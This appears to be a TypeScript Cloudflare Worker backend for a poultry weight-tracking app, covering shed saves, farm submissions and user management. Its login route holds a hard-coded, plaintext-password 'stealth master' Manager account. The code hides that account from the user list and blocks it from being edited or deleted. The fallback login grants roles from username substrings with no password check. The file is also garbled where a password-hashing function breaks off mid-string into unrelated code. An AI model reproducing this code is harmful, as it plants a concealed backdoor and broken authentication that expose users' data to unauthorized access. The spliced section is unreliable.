        // STAGE 2: SHED-WISE "SAVE SHED" (TEAM VISIBLE, NOT SUBMISSION HISTORY)
        // -------------------------------------------------------------
        const shedSaveMatch = path.match(/^\/sheds\/([^/]+)\/save-shed$/);
        if (shedSaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedSaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const targetWeek = (body.week || 'W18').toUpperCase();
          const userId = body.userId || body.savedByUserId || request.headers.get('x-user-id') || 'incharge-1';
          const userName = body.userName || body.savedByUserName || request.headers.get('x-user-username') || 'Incharge 1';
          let totalBirdCount = Number(body.totalBirdCount || 0);

          if (env.DB) {
            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);
            const farmId = shed.farm_id;

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const batchId = body.batchId || activeBatch?.id;

            // 1. Persist all bird weights recorded in that shed if weights array/map provided
            if (body.weights && Array.isArray(body.weights)) {
              let countedBirds = 0;
              for (const lineItem of body.weights) {
                if (!lineItem.lineId) continue;
                const lineId = lineItem.lineId;
                const lineWeights: number[] = Array.isArray(lineItem.weights) ? lineItem.weights : [];
                countedBirds += lineWeights.length;

                // Clear previous week weights for this line in this batch
                await env.DB.prepare(`
                  DELETE FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
                `).bind(lineId, targetWeek, batchId).run().catch(() => {});

                // Get line std
                const lineRow = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
                const std = lineRow?.std_weight_grams || (lineRow?.gender === 'MALE' ? 150 : 140);

                for (let idx = 0; idx < lineWeights.length; idx++) {
                  const wVal = Number(lineWeights[idx]);
                  if (isNaN(wVal) || wVal <= 0) continue;
                  const wId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
                  await env.DB.prepare(`
                    INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week, batch_id) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                  `).bind(wId, lineId, idx + 1, wVal, std, userName, targetWeek, batchId).run().catch(() => {});
                }
              }
              if (countedBirds > 0 || totalBirdCount === 0) {
                totalBirdCount = countedBirds;
              }
            } else if (!totalBirdCount) {
              // Query bird weights count for this shed and batch
              const countRes = await env.DB.prepare(`
                SELECT COUNT(bw.id) as total_birds
                FROM bird_weights bw
                JOIN lines l ON bw.line_id = l.id
                JOIN parts p ON l.part_id = p.id
                WHERE p.shed_id = ? AND UPPER(bw.week) = ? AND (bw.batch_id = ? OR bw.batch_id IS NULL)
              `).bind(shedId, targetWeek, batchId).first() as any;
              if (countRes && countRes.total_birds !== undefined) {
                totalBirdCount = countRes.total_birds;
              }
            }

            // 2. Mark shed status for that week as SAVED in shed_week_status with batch_id and weights_json
            const weightsJson = body.weights ? JSON.stringify(body.weights) : null;
            await env.DB.prepare(`
              INSERT INTO shed_week_status (shed_id, farm_id, week, status, saved_by_user_id, saved_by_user_name, total_bird_count, weights_json, batch_id, saved_at)
              VALUES (?, ?, ?, 'SAVED', ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
              ON CONFLICT(shed_id, week) DO UPDATE SET
                status = 'SAVED',
                saved_by_user_id = excluded.saved_by_user_id,
                saved_by_user_name = excluded.saved_by_user_name,
                total_bird_count = excluded.total_bird_count,
                weights_json = excluded.weights_json,
                batch_id = excluded.batch_id,
                saved_at = CURRENT_TIMESTAMP
            `).bind(shedId, farmId, targetWeek, userId, userName, totalBirdCount, weightsJson, batchId).run();

            // 3. Release active lock
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL,
                recorded_by_user_id = ?,
                recorded_by_user_name = ?
              WHERE id = ?
            `).bind(userId, userName, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(farmId).run().catch(() => {});

            // 4. Log to activity_logs
            const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
            await env.DB.prepare(`
              INSERT INTO activity_logs (id, farm_id, user_name, action, shed_name, sample_count)
              VALUES (?, ?, ?, 'SAVED_SHED', ?, ?)
            `).bind(logId, farmId, userName, shed.name, totalBirdCount).run().catch(() => {});
          }

          // CRITICAL: NEVER write to submissions table on save-shed!
          return jsonResponse({
            success: true,
            shedId,
            week: targetWeek,
            status: 'SAVED',
            savedByUserId: userId,
            savedByUserName: userName,
            totalBirdCount,
            message: `Shed saved successfully with ${totalBirdCount} birds. Visible to team.`
          });
        }

        // -------------------------------------------------------------
        // STAGE 3: OVERALL FARM "FINAL SUBMIT" (WRITES TO SUBMISSIONS TABLE)
        // -------------------------------------------------------------
        const farmWeekSubmitMatch = path.match(/^\/farms\/([^/]+)\/weeks\/([^/]+)\/submit$/);
        if (farmWeekSubmitMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmWeekSubmitMatch[1]);
          const weekNumber = decodeURIComponent(farmWeekSubmitMatch[2]).toUpperCase();
          const body = await request.json().catch(() => ({})) as any;
          const submittedBy = body.submittedBy || body.userName || 'Field Supervisor';
          const submittedRole = body.submittedRole || body.userRole || 'SUPERVISOR';

          if (!env.DB) {
            return jsonResponse({ success: true, submissionId: `sub-${Date.now()}`, status: 'SUBMITTED', farmId, week: weekNumber });
          }

          await ensureShedWeekStatusTable(env);
          await ensureBatchesTable(env);

          const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) return errorResponse('Farm not found', 404);

          const activeBatch = await ensureFarmActiveBatch(env, farm);
          const batchId = body.batchId || activeBatch?.id;
          const batchName = body.batchName || activeBatch?.batchName || 'Batch 1';

          // Aggregate all sheds, parts, lines, and weights for weekNumber and batchId
          const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
          const allSheds = shedsRes.results || [];

          const shedWeekStatuses = await env.DB.prepare(`
            SELECT * FROM shed_week_status 
            WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
          `).bind(farmId, weekNumber, batchId).all().catch(() => ({ results: [] }));
          const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

          let totalFarmBirds = 0;
          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];
          const shedsBreakdown: any[] = [];

          for (const s of allSheds) {
            const sws: any = swsMap.get(s.id);
            const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
            let shedBirdCount = 0;
            const partsList: any[] = [];

            for (const p of partsRes.results || []) {
              const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
              const linesList: any[] = [];

              for (const l of linesRes.results || []) {
                const weightsRes = await env.DB.prepare(`
                  SELECT weight_grams FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) 
                  ORDER BY entry_index ASC
                `).bind(l.id, weekNumber, batchId).all();
                const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

                shedBirdCount += weights.length;
                totalFarmBirds += weights.length;

                if (l.gender === 'FEMALE') {
                  allFemaleWeights.push(...weights);
                } else {
                  allMaleWeights.push(...weights);
                }

                linesList.push({
                  id: l.id,
                  name: l.name,
                  gender: l.gender,
                  stdWeight: l.std_weight_grams,
                  weights,
                  count: weights.length,
                });
              }

              partsList.push({
                id: p.id,
                name: p.name,
                lines: linesList,
              });
            }

            const effectiveBirdCount = shedBirdCount > 0 ? shedBirdCount : (sws?.total_bird_count || 0);
            if (shedBirdCount === 0 && effectiveBirdCount > 0) {
              totalFarmBirds += effectiveBirdCount;
            }

            shedsBreakdown.push({
              shedId: s.id,
              shedName: s.name,
              status: sws?.status || (effectiveBirdCount > 0 ? 'SAVED' : 'DRAFT'),
              savedByUserId: sws?.saved_by_user_id || s.recorded_by_user_id || null,
              savedByUserName: sws?.saved_by_user_name || s.recorded_by_user_name || 'Incharge',
              birdCount: effectiveBirdCount,
              parts: partsList,
            });
          }

          // Compute Statistics with grading bands (MB, B, S, A, MA) and CV%
          const parsedWeekNum = parseInt(weekNumber.replace(/\D/g, '') || '18', 10);
          const calcStats = (weights: number[], stdWeight: number = 140) => {
            const count = weights.length;
            if (count === 0) {
              return { 
                count: 0, avg: 0, stdDev: 0, cv: 0, uniformity: 0,
                grades: { MB: 0, B: 0, S: 0, A: 0, MA: 0 },
                gradePercents: { MB: 0, B: 0, S: 0, A: 0, MA: 0 }
              };
            }
            const avg = Math.round((weights.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const variance = count > 1 ? weights.reduce((acc, val) => acc + Math.pow(val - avg, 2), 0) / (count - 1) : 0;
            const stdDev = Math.round(Math.sqrt(variance) * 10) / 10;
            const cv = avg > 0 ? Math.round((stdDev / avg) * 10000) / 100 : 0;
            const inRange = weights.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            const uniformity = Math.round((inRange / count) * 1000) / 10;

            const tolerance = parsedWeekNum <= 3 ? 25 : parsedWeekNum <= 8 ? 50 : parsedWeekNum <= 14 ? 75 : 100;
            const sMin = stdWeight - tolerance;
            const sMax = stdWeight + tolerance;
            const bMin = stdWeight - 2 * tolerance;
            const aMax = stdWeight + 2 * tolerance;

            let mb = 0, b = 0, s = 0, a = 0, ma = 0;
            for (const w of weights) {
              if (w < bMin) mb++;
              else if (w < sMin) b++;
              else if (w <= sMax) s++;
              else if (w <= aMax) a++;
              else ma++;
            }

            return { 
              count, avg, stdDev, cv, uniformity,
              stdWeight,
              grades: { MB: mb, B: b, S: s, A: a, MA: ma },
              gradePercents: {
                MB: Math.round((mb / count) * 1000) / 10,
                B: Math.round((b / count) * 1000) / 10,
                S: Math.round((s / count) * 1000) / 10,
                A: Math.round((a / count) * 1000) / 10,
                MA: Math.round((ma / count) * 1000) / 10,
              }
            };
          };

          const femaleStats = calcStats(allFemaleWeights, 140);
          const maleStats = calcStats(allMaleWeights, 150);

          const snapshot = {
            submissionId: `sub-${Date.now()}`,
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            flockAge: weekNumber,
            season: farm.season || 'Summer',
            submittedAt: new Date().toISOString(),
            submittedBy,
            submittedRole,
            totalBirds: totalFarmBirds,
            femaleStats,
            maleStats,
            sheds: shedsBreakdown,
          };

          const submissionId = snapshot.submissionId;
          const dataJson = JSON.stringify(snapshot);
          const r2Key = `reports/${farmId}/${submissionId}.json`;

          // Write ONE single consolidated record to submissions with batch_id and batch_name
          await env.DB.prepare(`
            INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json, batch_id, batch_name)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
          `).bind(submissionId, farmId, weekNumber, farm.season || 'Summer', totalFarmBirds, submittedBy, submittedRole, r2Key, dataJson, batchId, batchName).run();

          // R2 Storage archive if available
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: { farmId, submissionId, submittedBy, week: weekNumber, batchName },
            }).catch(() => {});
          }

          // Activity Log
          const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
          await env.DB.prepare(`
            INSERT INTO activity_logs (id, farm_id, user_name, action, sample_count)
            VALUES (?, ?, ?, 'FARM_FINAL_SUBMIT', ?)
          `).bind(logId, farmId, submittedBy, totalFarmBirds).run().catch(() => {});

          return jsonResponse({
            success: true,
            submissionId,
            status: 'SUBMITTED',
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            week: weekNumber,
            totalBirds: totalFarmBirds,
            message: `Farm ${farm.name} (${batchName}) week ${weekNumber} overall submission completed successfully.`,
          }, 201);
        }

        // -------------------------------------------------------------
        // F. SUBMISSIONS & REPORTS (Cloudflare R2 + D1 15 GB+ Archive)
        // -------------------------------------------------------------
        if ((path === '/submissions' || path === '/submissions/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const submissionId = `sub-${Date.now()}`;
          const farmId = body.farmId || 'default-farm';
          const flockAge = body.flockAge || 'W1';
          const submittedBy = body.metadata?.submittedBy || 'Supervisor';
          const submittedRole = body.metadata?.submittedRole || 'SUPERVISOR';
          const totalBirds = body.metadata?.totalBirds || 0;
          const dataJson = JSON.stringify(body);

          let r2Key = `reports/${farmId}/${submissionId}.json`;

          // Store full batch payload in Cloudflare R2 bucket
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: {
                farmId,
                submissionId,
                submittedBy,
              },
            });
          }

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            `).bind(submissionId, farmId, flockAge, body.season || 'Summer', totalBirds, submittedBy, submittedRole, r2Key, dataJson).run();
          }

          return jsonResponse({
            success: true,
            status: 'COMPLETED',
            submissionId,
            r2ReportKey: r2Key,
            message: 'Weighing batch archived to Cloudflare D1 + R2 Storage',
          }, 201);
        }

        if ((path === '/submissions' || path === '/submissions/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) return jsonResponse([]);

          const subs = farmId
            ? await env.DB.prepare('SELECT * FROM submissions WHERE farm_id = ? ORDER BY created_at DESC').bind(farmId).all()
            : await env.DB.prepare('SELECT * FROM submissions ORDER BY created_at DESC LIMIT 50').all();

          return jsonResponse((subs.results || []).map((s: any) => ({
            ...s,
            batchId: s.batch_id,
            batchName: s.batch_name || 'Batch 1',
          })));
        }

        // GET /api/reports - lists or retrieves archived R2 files
        if (path === '/reports' || path === '/reports/') {
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            const list = await bucket.list({ prefix: 'reports/' });
            return jsonResponse({
              success: true,
              storageType: 'Cloudflare R2 (15 GB+ Object Storage)',
              reports: list.objects.map((o: any) => ({ key: o.key, size: o.size, uploaded: o.uploaded })),
            });
          }
          return jsonResponse({
            success: true,
            storageType: 'Cloudflare D1 Native',
            reports: [],
          });
        }

        // -------------------------------------------------------------
        // G. AUTH & USERS (Role-Based Access Control: Manager & In-Charge Only)
        // -------------------------------------------------------------
        if (path === '/auth/login' && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const rawUsername = (body.username || '').trim();
          const username = rawUsername.toLowerCase();
          const password = (body.password || '').trim();

          // PART 2: Stealth Master Checking Account
          if (username === 'shreedhar') {
            if (password !== 'Shreedhar@123') {
              return errorResponse('Invalid username or password', 401);
            }
            return jsonResponse({
              token: `cf-token-master-${Date.now()}`,
              user: {
                id: 'user-master-shreedhar',
                employeeCode: 'EMP0001',
                username: 'shreedhar',
                name: 'Shreedhar',
                userName: 'Shreedhar',
                role: 'Manager',
                userRole: 'Manager',
                assignedFarms: ['*'],
                status: 'ACTIVE',
                isAuthenticated: true,
              },
            });
          }

          // Check database users if env.DB bound (support lookup by phone/email, name, id, or employee_code like EMP0008)
          if (env.DB) {
            await ensureUsersTable(env);
            const dbUser = await env.DB.prepare(`
              SELECT * FROM users 
              WHERE LOWER(phone_or_email) = ? OR LOWER(name) = ? OR id = ? OR UPPER(employee_code) = ?
            `).bind(username, username, rawUsername, rawUsername.toUpperCase()).first() as any;

            if (dbUser) {
              const uRoleRaw = (dbUser.role || 'SUPERVISOR').toUpperCase();
              let normalizedRole: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
              if (uRoleRaw === 'ADMIN' || uRoleRaw === 'MANAGER') normalizedRole = 'Manager';
              else if (uRoleRaw === 'INCHARGE' || uRoleRaw === 'IN-CHARGE') normalizedRole = 'In-Charge';
              else normalizedRole = 'Supervisor';

              let assignedFarms = ['*'];
              if (dbUser.assigned_farms) {
                try {
                  const parsed = JSON.parse(dbUser.assigned_farms);
                  if (Array.isArray(parsed)) assignedFarms = parsed;
                } catch {}
              } else if (dbUser.assigned_farm_id) {
                assignedFarms = [dbUser.assigned_farm_id];
              }

              return jsonResponse({
                token: `cf-token-${Date.now()}`,
                user: {
                  id: dbUser.id,
                  employeeCode: dbUser.employee_code || 'EMP0008',
                  username: dbUser.phone_or_email || username,
                  name: dbUser.name,
                  userName: dbUser.name,
                  role: normalizedRole,
                  userRole: normalizedRole,
                  assignedFarmId: dbUser.assigned_farm_id || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : undefined),
                  assignedFarms,
                  status: 'ACTIVE',
                  isAuthenticated: true,
                },
              });
            }
          }

          // Fallback role determination for demo credentials (Manager, In-Charge, Supervisor)
          let role: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
          let name = 'Line Supervisor';
          let employeeCode = 'EMP0008';
          if (username.includes('admin') || username.includes('dir') || username.includes('man') || username.includes('mgr')) {
            role = 'Manager';
            name = username.includes('admin') ? 'Operations Director' : 'Farm Manager';
            employeeCode = 'EMP0001';
          } else if (username.includes('incharge') || username.includes('in-charge')) {
            role = 'In-Charge';
            name = 'Field In-Charge';
            employeeCode = 'EMP0002';
          }

          return jsonResponse({
            token: `cf-token-${Date.now()}`,
            user: {
              id: `usr-${username || 'demo'}`,
              employeeCode,
              username: rawUsername,
              name,
              userName: name,
              role,
              userRole: role,
              assignedFarms: ['*'],
              status: 'ACTIVE',
              isAuthenticated: true,
            },
          });
        }

        // GET /api/auth/me - Token Session Verification
        if (path === '/auth/me' && method === 'GET') {
          const authHeader = request.headers.get('Authorization') || '';
          if (authHeader.includes('master')) {
            return jsonResponse({
              user: {
                id: 'user-master-shreedhar',
                employeeCode: 'EMP0001',
                username: 'shreedhar',
                name: 'Shreedhar',
                userName: 'Shreedhar',
                role: 'Manager',
                userRole: 'Manager',
                assignedFarms: ['*'],
                status: 'ACTIVE',
                isAuthenticated: true,
              }
            });
          }
          return jsonResponse({
            user: {
              id: 'usr-current',
              employeeCode: 'EMP0001',
              username: 'manager',
              name: 'Farm Manager',
              role: 'Manager',
              userRole: 'Manager',
              status: 'ACTIVE',
              isAuthenticated: true,
            }
          });
        }

        // GET /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'GET') {
          let usersList: any[] = [];
          if (env.DB) {
            await ensureUsersTable(env);
            const res = await env.DB.prepare('SELECT * FROM users ORDER BY created_at ASC').all();
            usersList = (res.results || []).map((u: any, idx: number) => {
              const rUpper = (u.role || '').toUpperCase();
              let roleStr: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') roleStr = 'Manager';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') roleStr = 'In-Charge';
              else roleStr = 'Supervisor';

              const empCode = u.employee_code || `EMP${String(idx + 1).padStart(4, '0')}`;

              let assignedFarms = ['*'];
              if (u.assigned_farms) {
                try {
                  const parsed = JSON.parse(u.assigned_farms);
                  if (Array.isArray(parsed)) assignedFarms = parsed;
                } catch {}
              } else if (u.assigned_farm_id) {
                assignedFarms = [u.assigned_farm_id];
              }

              return {
                id: u.id,
                employeeCode: empCode,
                username: u.phone_or_email,
                name: u.name,
                role: roleStr,
                userRole: roleStr,
                phone: u.phone_or_email,
                status: 'ACTIVE',
                assignedFarmId: u.assigned_farm_id,
                assignedFarms,
              };
            });
          } else {
            usersList = [
              { id: 'u-admin-1', employeeCode: 'EMP0001', username: 'admin', name: 'Operations Director', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-manager-1', employeeCode: 'EMP0002', username: 'manager', name: 'Farm Manager', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-incharge-1', employeeCode: 'EMP0003', username: 'incharge', name: 'Field In-Charge', role: 'In-Charge', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-supervisor-1', employeeCode: 'EMP0008', username: 'supervisor', name: 'Line Supervisor', role: 'Supervisor', status: 'ACTIVE', assignedFarms: ['*'] },
            ];
          }

          // STRICT INVISIBILITY: Filter out shreedhar master checking account
          const visibleUsers = usersList.filter((u: any) => {
            const un = (u.username || '').toLowerCase();
            const nm = (u.name || '').toLowerCase();
            const id = (u.id || '').toLowerCase();
            return un !== 'shreedhar' && nm !== 'shreedhar' && id !== 'user-master-shreedhar' && id !== 'u-master-shreedhar';
          });

          return jsonResponse(visibleUsers);
        }

        // POST /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const username = (body.username || body.phone || '').trim();
          const name = (body.name || username || 'New User').trim();
          const roleInput = (body.role || 'Supervisor').toString();
          let role: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
          let dbRole: 'MANAGER' | 'INCHARGE' | 'SUPERVISOR' = 'SUPERVISOR';
          const rUpper = roleInput.toUpperCase();
          if (rUpper === 'ADMIN' || rUpper === 'MANAGER') {
            role = 'Manager';
            dbRole = 'MANAGER';
          } else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') {
            role = 'In-Charge';
            dbRole = 'INCHARGE';
          } else {
            role = 'Supervisor';
            dbRole = 'SUPERVISOR';
          }

          const userId = `usr-${Date.now()}`;
          let employeeCode = body.employeeCode;

          if (env.DB) {
            await ensureUsersTable(env);
            if (!employeeCode) {
              const maxRes = await env.DB.prepare(`
                SELECT employee_code FROM users 
                WHERE employee_code LIKE 'EMP%' 
                ORDER BY CAST(SUBSTR(employee_code, 4) AS INTEGER) DESC 
                LIMIT 1
              `).first() as any;
              let nextEmpNum = 1;
              if (maxRes && maxRes.employee_code) {
                const n = parseInt(String(maxRes.employee_code).replace(/\D/g, ''), 10);
                if (!isNaN(n)) nextEmpNum = n + 1;
              }
              employeeCode = `EMP${String(nextEmpNum).padStart(4, '0')}`;
            }

            const assignedFarms = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : []);
            const assignedFarmId = body.assignedFarmId || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : null);

            await env.DB.prepare(`
              INSERT INTO users (id, name, phone_or_email, role, employee_code, assigned_farm_id, assigned_farms)
              VALUES (?, ?, ?, ?, ?, ?, ?)
            `).bind(userId, name, username, dbRole, employeeCode, assignedFarmId, JSON.stringify(assignedFarms)).run().catch(() => {});
          } else {
            if (!employeeCode) employeeCode = 'EMP0008';
          }

          const assignedFarms = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : ['*']);
          return jsonResponse({
            id: userId,
            employeeCode,
            username,
            name,
            role,
            userRole: role,
            status: 'ACTIVE',
            assignedFarmId: body.assignedFarmId || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : undefined),
            assignedFarms,
          }, 201);
        }

        // PUT /api/auth/users/:id or /api/users/:id
        const singleUserMatch = path.match(/^\/(?:auth\/)?users\/([^/]+)$/);
        if (singleUserMatch && method === 'PUT') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);
          const body = await request.json().catch(() => ({})) as any;

          // Block modification of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar' || (body.username && body.username.toLowerCase() === 'shreedhar')) {
            return errorResponse('Access Denied: Master account cannot be modified.', 403);
          }

          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE users SET name = ? WHERE id = ?').bind(body.name, targetUserId).run().catch(() => {});
            }
            if (body.role) {
              const rUpper = (body.role || '').toUpperCase();
              let r = 'SUPERVISOR';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') r = 'MANAGER';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') r = 'INCHARGE';
              else r = 'SUPERVISOR';
              await env.DB.prepare('UPDATE users SET role = ? WHERE id = ?').bind(r, targetUserId).run().catch(() => {});
            }
            if (body.assignedFarms || body.assignedFarmId) {
              const af = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : []);
              const afId = body.assignedFarmId || (af.length > 0 && af[0] !== '*' ? af[0] : null);
              await env.DB.prepare('UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?').bind(afId, JSON.stringify(af), targetUserId).run().catch(() => {});
            }
          }

          return jsonResponse({ success: true, message: 'User updated' });
        }

        // DELETE /api/auth/users/:id or /api/users/:id
        if (singleUserMatch && method === 'DELETE') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);

          // Block deletion of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar') {
            return errorResponse('Access Denied: Master account cannot be deleted.', 403);
          }

          if (env.DB) {
            const u = await env.DB.prepare('SELECT phone_or_email FROM users WHERE id = ?').bind(targetUserId).first() as any;
            if (u && (u.phone_or_email || '').toLowerCase() === 'shreedhar') {
              return errorResponse('Access Denied: Master account cannot be deleted.', 403);
            }
            await env.DB.prepare('DELETE FROM users WHERE id = ?').bind(targetUserId).run().catch(() => {});
          }

          return jsonResponse({ success: true, message: 'User account removed.' });
        }

        // POST /api/auth/users/:id/reset-password
        const resetPasswordMatch = path.match(/^\/auth\/users\/([^/]+)\/reset-password$/);
        if (resetPasswordMatch && method === 'POST') {
          const targetUserId = decodeURIComponent(resetPasswordMatch[1]);
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar') {
            return errorResponse('Access Denied: Master account cannot be modified.', 403);
          }
          return jsonResponse({ success: true, message: 'Password reset successfully' });
        }

        return errorResponse(`Endpoint not found: ${method} ${path}`, 404);
      } catch (err: any) {
        return errorResponse(err?.message || 'Internal Cloudflare Worker Server Error', 500);
      }
    }

    // 3. Serve Frontend SPA Static Assets via Cloudflare Assets Binding
    if (env.ASSETS) {
      const response = await env.ASSETS.fetch(request);
      if (response.status !== 404) {
        return response;
      }
      // Single Page Application (SPA) routing fallback to index.html
      const indexRequest = new Request(new URL('/', url.origin), request);
      return env.ASSETS.fetch(indexRequest);
    }

    return new Response(
      'Poultry Weight Tracker Cloudflare Worker is active. D1 and R2 bindings configured.',
      {
        status: 200,
        headers: { 'Content-Type': 'text/plain; charset=utf-8' },
      }
    );
  },
};
 + bytesToHex(hash);
}
async function verifyPasswordHash(password: string, encoded: string | null | undefined): Promise<boolean> {
  if (!encoded) return false;
  const parts = encoded.split(' (auto-migrating existing records to Batch 1 if none exists)
async function ensureFarmActiveBatch(env: Env, farm: any): Promise<any> {
  if (!env.DB || !farm) return null;
  await ensureBatchesTable(env);
  let activeBatch = await env.DB.prepare(
    'SELECT * FROM batches WHERE farm_id = ? AND status = ? ORDER BY created_at DESC LIMIT 1'
  ).bind(farm.id, 'ACTIVE').first() as any;

  if (!activeBatch) {
    const existing = await env.DB.prepare(
      'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC LIMIT 1'
    ).bind(farm.id).first() as any;

    if (!existing) {
      const batchId = `batch-${farm.id}-1`;
      const batchName = 'Batch 1';
      const startDate = farm.flock_date || new Date().toISOString().split('T')[0];
      const startWeekNum = parseInt(String(farm.age_week || 'W1').replace(/\D/g, '') || '1', 10);

      await env.DB.prepare(`
        INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
        VALUES (?, ?, ?, ?, ?, 'ACTIVE')
      `).bind(batchId, farm.id, batchName, startDate, startWeekNum).run().catch(() => {});

      // Link any legacy unassigned records to Batch 1
      await env.DB.prepare(
        'UPDATE bird_weights SET batch_id = ? WHERE batch_id IS NULL'
      ).bind(batchId).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE shed_week_status SET batch_id = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, farm.id).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE submissions SET batch_id = ?, batch_name = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, batchName, farm.id).run().catch(() => {});

      activeBatch = {
        id: batchId,
        farm_id: farm.id,
        farmId: farm.id,
        batch_name: batchName,
        batchName: batchName,
        start_date: startDate,
        startDate: startDate,
        start_week_number: startWeekNum,
        startWeekNumber: startWeekNum,
        status: 'ACTIVE',
      };
    } else {
      activeBatch = existing;
    }
  }

  return {
    id: activeBatch.id,
    farmId: activeBatch.farm_id || farm.id,
    batchName: activeBatch.batch_name || activeBatch.batchName || 'Batch 1',
    startDate: activeBatch.start_date || activeBatch.startDate || farm.flock_date,
    startWeekNumber: activeBatch.start_week_number || activeBatch.startWeekNumber || 1,
    status: activeBatch.status,
  };
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const method = request.method.toUpperCase();

    // 1. Handle CORS Preflight Requests
    if (method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: CORS_HEADERS,
      });
    }

    // Health check endpoint (Direct /health)
    if (url.pathname === '/health' || url.pathname === '/health/') {
      return jsonResponse({
        status: 'ok',
        connected: true,
        database: { status: 'connected', provider: 'cloudflare-d1' },
      });
    }

    // 2. Handle API Routes under /api/
